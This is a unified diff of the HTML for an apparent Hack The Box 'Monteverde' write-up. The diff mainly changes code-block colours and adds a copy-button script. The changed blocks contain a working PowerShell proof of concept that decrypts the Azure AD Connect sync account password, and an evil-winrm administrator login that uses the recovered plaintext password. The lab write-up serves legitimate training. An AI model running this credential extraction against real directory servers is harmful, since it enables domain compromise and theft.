-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>    Write-Host <span style="color:#48b685">&#34;AD Connect Sync Credential Extract POC (@_xpn_)</span><span style="color:#f99b15">`n</span><span style="color:#48b685">&#34;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>[-] <span style="color:#ef6155">$client</span> = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span style="color:#48b685">&#34;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&#34;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>[+] <span style="color:#ef6155">$client</span> = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span style="color:#48b685">&#34;Data Source=localhost; Initial Catalog=ADSync; Trusted_Connection=True&#34;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>    <span style="color:#ef6155">$client</span>.Open()
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>    <span style="color:#ef6155">$cmd</span> = <span style="color:#ef6155">$client</span>.CreateCommand()
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>    <span style="color:#ef6155">$cmd</span>.CommandText = <span style="color:#48b685">&#34;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&#34;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>    <span style="color:#ef6155">$reader</span> = <span style="color:#ef6155">$cmd</span>.ExecuteReader()
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    <span style="color:#ef6155">$reader</span>.Read() | Out-Null
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>    <span style="color:#ef6155">$key_id</span> = <span style="color:#ef6155">$reader</span>.GetInt32(0)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>    <span style="color:#ef6155">$instance_id</span> = <span style="color:#ef6155">$reader</span>.GetGuid(1)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>    <span style="color:#ef6155">$entropy</span> = <span style="color:#ef6155">$reader</span>.GetGuid(2)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>    <span style="color:#ef6155">$reader</span>.Close()
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>    <span style="color:#ef6155">$cmd</span> = <span style="color:#ef6155">$client</span>.CreateCommand()
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>    <span style="color:#ef6155">$cmd</span>.CommandText = <span style="color:#48b685">&#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#39;AD&#39;&#34;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>    <span style="color:#ef6155">$reader</span> = <span style="color:#ef6155">$cmd</span>.ExecuteReader()
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>    <span style="color:#ef6155">$reader</span>.Read() | Out-Null
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>    <span style="color:#ef6155">$config</span> = <span style="color:#ef6155">$reader</span>.GetString(0)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>    <span style="color:#ef6155">$crypted</span> = <span style="color:#ef6155">$reader</span>.GetString(1)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>    <span style="color:#ef6155">$reader</span>.Close()
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>    add-type -path <span style="color:#48b685">&#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#39;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>    <span style="color:#ef6155">$km</span> = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>    <span style="color:#ef6155">$km</span>.LoadKeySet(<span style="color:#ef6155">$entropy</span>, <span style="color:#ef6155">$instance_id</span>, <span style="color:#ef6155">$key_id</span>)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>    <span style="color:#ef6155">$key</span> = <span style="color:#ef6155">$null</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>    <span style="color:#ef6155">$km</span>.GetActiveCredentialKey(<span style="color:#ef6155">[ref]</span><span style="color:#ef6155">$key</span>)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>    <span style="color:#ef6155">$key2</span> = <span style="color:#ef6155">$null</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>    <span style="color:#ef6155">$km</span>.GetKey(1, <span style="color:#ef6155">[ref]</span><span style="color:#ef6155">$key2</span>)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>    <span style="color:#ef6155">$decrypted</span> = <span style="color:#ef6155">$null</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>    <span style="color:#ef6155">$key2</span>.DecryptBase64ToString(<span style="color:#ef6155">$crypted</span>, <span style="color:#ef6155">[ref]</span><span style="color:#ef6155">$decrypted</span>)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>    <span style="color:#ef6155">$domain</span> = select-xml -Content <span style="color:#ef6155">$config</span> -XPath <span style="color:#48b685">&#34;//parameter[@name=&#39;forest-login-domain&#39;]&#34;</span> | select @{Name = <span style="color:#48b685">&#39;Domain&#39;</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>    Expression = {<span style="color:#ef6155">$_</span>.node.InnerXML}}
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span>    <span style="color:#ef6155">$username</span> = select-xml -Content <span style="color:#ef6155">$config</span> -XPath <span style="color:#48b685">&#34;//parameter[@name=&#39;forest-login-user&#39;]&#34;</span> | select @{Name = <span style="color:#48b685">&#39;Username&#39;</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span>    Expression = {<span style="color:#ef6155">$_</span>.node.InnerXML}}
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span>    <span style="color:#ef6155">$password</span> = select-xml -Content <span style="color:#ef6155">$decrypted</span> -XPath <span style="color:#48b685">&#34;//attribute&#34;</span> | select @{Name = <span style="color:#48b685">&#39;Password&#39;</span>; Expression = {<span style="color:#ef6155">$_</span>.node.InnerText}}
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span>    Write-Host (<span style="color:#48b685">&#34;Domain: &#34;</span> + <span style="color:#ef6155">$domain</span>.Domain)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span>    Write-Host (<span style="color:#48b685">&#34;Username: &#34;</span> + <span style="color:#ef6155">$username</span>.Username)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span>    Write-Host (<span style="color:#48b685">&#34;Password: &#34;</span> + <span style="color:#ef6155">$password</span>.Password)
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span>    <span style="color:#24909d">Write-Host</span> <span style="color:#ed9d13">&#34;AD Connect Sync Credential Extract POC (@_xpn_)</span><span style="color:#ed9d13">`n</span><span style="color:#ed9d13">&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>[-] <span style="color:#40ffff">$client</span> = <span style="color:#24909d">new-object</span> System.Data.SqlClient.SqlConnection -ArgumentList <span style="color:#ed9d13">&#34;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>[+] <span style="color:#40ffff">$client</span> = <span style="color:#24909d">new-object</span> System.Data.SqlClient.SqlConnection -ArgumentList <span style="color:#ed9d13">&#34;Data Source=localhost; Initial Catalog=ADSync; Trusted_Connection=True&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>    <span style="color:#40ffff">$client</span>.Open()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>    <span style="color:#40ffff">$cmd</span> = <span style="color:#40ffff">$client</span>.CreateCommand()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>    <span style="color:#40ffff">$cmd</span>.CommandText = <span style="color:#ed9d13">&#34;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>    <span style="color:#40ffff">$reader</span> = <span style="color:#40ffff">$cmd</span>.ExecuteReader()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>    <span style="color:#40ffff">$reader</span>.Read() | <span style="color:#24909d">Out-Null</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>    <span style="color:#40ffff">$key_id</span> = <span style="color:#40ffff">$reader</span>.GetInt32(0)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>    <span style="color:#40ffff">$instance_id</span> = <span style="color:#40ffff">$reader</span>.GetGuid(1)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span>    <span style="color:#40ffff">$entropy</span> = <span style="color:#40ffff">$reader</span>.GetGuid(2)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span>    <span style="color:#40ffff">$reader</span>.Close()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span>    <span style="color:#40ffff">$cmd</span> = <span style="color:#40ffff">$client</span>.CreateCommand()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span>    <span style="color:#40ffff">$cmd</span>.CommandText = <span style="color:#ed9d13">&#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#39;AD&#39;&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span>    <span style="color:#40ffff">$reader</span> = <span style="color:#40ffff">$cmd</span>.ExecuteReader()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span>    <span style="color:#40ffff">$reader</span>.Read() | <span style="color:#24909d">Out-Null</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span>    <span style="color:#40ffff">$config</span> = <span style="color:#40ffff">$reader</span>.GetString(0)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span>    <span style="color:#40ffff">$crypted</span> = <span style="color:#40ffff">$reader</span>.GetString(1)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">22</span>    <span style="color:#40ffff">$reader</span>.Close()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">23</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">24</span>    <span style="color:#24909d">add-type</span> -path <span style="color:#ed9d13">&#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">25</span>    <span style="color:#40ffff">$km</span> = <span style="color:#24909d">New-Object</span> -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">26</span>    <span style="color:#40ffff">$km</span>.LoadKeySet(<span style="color:#40ffff">$entropy</span>, <span style="color:#40ffff">$instance_id</span>, <span style="color:#40ffff">$key_id</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">27</span>    <span style="color:#40ffff">$key</span> = <span style="color:#40ffff">$null</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">28</span>    <span style="color:#40ffff">$km</span>.GetActiveCredentialKey(<span style="color:#40ffff">[ref]</span><span style="color:#40ffff">$key</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">29</span>    <span style="color:#40ffff">$key2</span> = <span style="color:#40ffff">$null</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">30</span>    <span style="color:#40ffff">$km</span>.GetKey(1, <span style="color:#40ffff">[ref]</span><span style="color:#40ffff">$key2</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">31</span>    <span style="color:#40ffff">$decrypted</span> = <span style="color:#40ffff">$null</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">32</span>    <span style="color:#40ffff">$key2</span>.DecryptBase64ToString(<span style="color:#40ffff">$crypted</span>, <span style="color:#40ffff">[ref]</span><span style="color:#40ffff">$decrypted</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">33</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">34</span>    <span style="color:#40ffff">$domain</span> = <span style="color:#24909d">select-xml</span> -Content <span style="color:#40ffff">$config</span> -XPath <span style="color:#ed9d13">&#34;//parameter[@name=&#39;forest-login-domain&#39;]&#34;</span> | <span style="color:#24909d">select </span>@{Name = <span style="color:#ed9d13">&#39;Domain&#39;</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">35</span>    Expression = {<span style="color:#40ffff">$_</span>.node.InnerXML}}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">36</span>    <span style="color:#40ffff">$username</span> = <span style="color:#24909d">select-xml</span> -Content <span style="color:#40ffff">$config</span> -XPath <span style="color:#ed9d13">&#34;//parameter[@name=&#39;forest-login-user&#39;]&#34;</span> | <span style="color:#24909d">select </span>@{Name = <span style="color:#ed9d13">&#39;Username&#39;</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">37</span>    Expression = {<span style="color:#40ffff">$_</span>.node.InnerXML}}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">38</span>    <span style="color:#40ffff">$password</span> = <span style="color:#24909d">select-xml</span> -Content <span style="color:#40ffff">$decrypted</span> -XPath <span style="color:#ed9d13">&#34;//attribute&#34;</span> | <span style="color:#24909d">select </span>@{Name = <span style="color:#ed9d13">&#39;Password&#39;</span>; Expression = {<span style="color:#40ffff">$_</span>.node.InnerText}}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">39</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">40</span>    <span style="color:#24909d">Write-Host</span> (<span style="color:#ed9d13">&#34;Domain: &#34;</span> + <span style="color:#40ffff">$domain</span>.Domain)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">41</span>    <span style="color:#24909d">Write-Host</span> (<span style="color:#ed9d13">&#34;Username: &#34;</span> + <span style="color:#40ffff">$username</span>.Username)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">42</span>    <span style="color:#24909d">Write-Host</span> (<span style="color:#ed9d13">&#34;Password: &#34;</span> + <span style="color:#40ffff">$password</span>.Password)
 </code></pre></div><p>We transfer the script to the target machine and run it to get the
 administrator creds</p>
 <p><img src="/img/htb_montevarde/10.png" alt=""></p>
@@ -614,7 +610,7 @@ Password: d0m@in4dminyeah!</p>
 </blockquote>
 <h2 id="administrator-shell">Administrator shell</h2>
 <p>We use evilwinrm to get a administrator shell and read our required root.txt.</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>evil-winrm -i 10.10.10.172 -u administrator -p d0m@in4dminyeah!
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>evil-winrm -i 10.10.10.172 -u administrator -p d0m@in4dminyeah!
 </code></pre></div><p><img src="/img/htb_montevarde/11.png" alt=""></p>
 <h1 id="resources">Resources:</h1>
 <ul>
@@ -770,6 +766,64 @@ the localhost. So we must chnage the source and then compile it to use it.</p>
         
         hasInnerContainers: true,
     });
+</script>
+
+
+/* copy code button */
+<script>
+function addCopyButtons(clipboard) {
+    document.querySelectorAll('pre > code').forEach(function (codeBlock) {
+        var button = document.createElement('button');
+        button.className = 'copy-code-button';
+        button.type = 'button';
+        button.innerText = 'Copy';
+
+        button.addEventListener('click', function () {
+              
+            tmp = codeBlock.innerText.split("\n");
+            cutChar = (tmp.length>8) ? 2 : 1;
+            for(i=0; i<tmp.length; i++){
+              tmp[i] = tmp[i].substring(cutChar);
+            }
+            block = tmp.join("\n");
+            clipboard.writeText(block).then(function () {
+                
+
+                button.blur();
+
+                button.innerText = 'Copied!';
+
+                setTimeout(function () {
+                    button.innerText = 'Copy';
+                }, 2000);
+            }, function (error) {
+                button.innerText = 'Error';
+            });
+        });
+
+        var pre = codeBlock.parentNode;
+        if (pre.parentNode.classList.contains('highlight')) {
+            var highlight = pre.parentNode;
+            highlight.parentNode.insertBefore(button, highlight);
+        } else {
+            pre.parentNode.insertBefore(button, pre);
+        }
+    });
+}
+if (navigator && navigator.clipboard) {
+    addCopyButtons(navigator.clipboard);
+} else {
+    var script = document.createElement('script');
+    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/clipboard-polyfill/2.7.0/clipboard-polyfill.promise.js';
+    script.integrity = 'sha256-waClS2re9NUbXRsryKoof+F9qc1gjjIhc2eT7ZbIv94=';
+    script.crossOrigin = 'anonymous';
+    script.onload = function() {
+        addCopyButtons(clipboard);
+    };
+
+    document.body.appendChild(script);
+}
+
 </script>
 
 
